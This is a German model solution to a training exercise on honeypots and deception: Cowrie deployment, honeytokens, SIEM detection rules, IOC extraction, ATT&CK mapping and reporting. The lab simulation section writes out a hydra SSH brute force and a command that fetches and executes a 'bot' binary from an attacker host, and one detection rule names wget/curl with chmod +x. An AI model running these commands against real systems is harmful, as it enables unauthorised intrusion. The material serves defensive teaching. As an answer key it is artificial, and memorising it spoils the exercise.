# Lösung – Übung 10: Deception-Capstone

Kein „einziger richtiger" Weg – dies ist ein Muster-Lösungspfad. Entscheidend ist die **nachgewiesene Kette** Erkennung → Auswertung → Verwertung → Report.

## 1. Deployment

- Cowrie in VLAN `HPOT` (extern 22→2222), Admin-SSH getrennt, **Egress-Deny** in OPNsense.
- Honeytokens: Honeyfile `gehaelter_2026.xlsx` (auditd-Watch) auf Server-VLAN, Canary-Account `svc-backup-legacy` im AD, 1 Canarytoken-URL in einer „internen" Wiki-Seite.

## 2. SIEM-Anbindung + Detections

- Cowrie-JSON + auditd + AD-Logons → Wazuh/ELK; Dashboard „Deception".
- Regel A (atomar): Zugriff auf Honeyfile (`key=honeyfile`) → High.
- Regel B (TTP): in einer Cowrie-Session `login.success` + `wget|curl` + `chmod +x` < 60 s → High (ATT&CK T1105/T1059).

## 3. Angriffssimulation (Kali)

```bash
hydra -l root -P rockyou.txt ssh://<hpot-ip>     # Brute Force
ssh root@<hpot-ip>                               # "Login"
  uname -a; wget http://<kali>/bot; chmod +x bot; ./bot; exit
# intern:
cat /srv/share/gehaelter_2026.xlsx              # Honeyfile-Trigger
```
Nachweis: Alarme A und B feuern; Dashboard zeigt Session + Quell-IP.

## 4. IOCs + ATT&CK

- IOCs: Kali-IP, Download-URL, Datei-SHA256, SSH-Client-Version (dedupliziert via `jq`).
- Verwertung: IP → OPNsense-Alias/Block; Hash → YARA/Watchlist; TTP → Suricata-Regel.
- ATT&CK: T1110 Brute Force → T1078/Initial Access → T1059 Execution → T1105 Ingress Tool Transfer → (Honeyfile) T1083/T1005 Discovery/Collection.

## 5. Report

Mit `deception-report-template.md`: Management Summary, Setup/Platzierung, Angriffs-Timeline, IOC-Tabelle, ATT&CK-Mapping, ausgelöste Detections, Risiken & Einhegung, Empfehlungen (z. B. interne Deception ausbauen, Egress härten).

## Bewertungs-Checkliste

- [ ] Honeypot + ≥3 Honeytokens an begründeten Stellen, Egress eingehegt
- [ ] Alle Quellen im SIEM, Dashboard + ≥2 Regeln (1 TTP-basiert)
- [ ] Angriff erkannt (Alarme nachgewiesen)
- [ ] IOCs extrahiert + verwertet, ATT&CK-Mapping
- [ ] Vollständiger, teilbarer Report

## Häufige Fehler / Troubleshooting

- Alarme „gebaut", aber nie durch echten Testangriff verifiziert.
- Egress vergessen → Honeypot könnte real nach außen wirken.
- IOCs gesammelt, aber nicht operationalisiert (kein Block/IDS/Watchlist).
- Report ohne Timeline/ATT&CK → schwer nachvollziehbar.
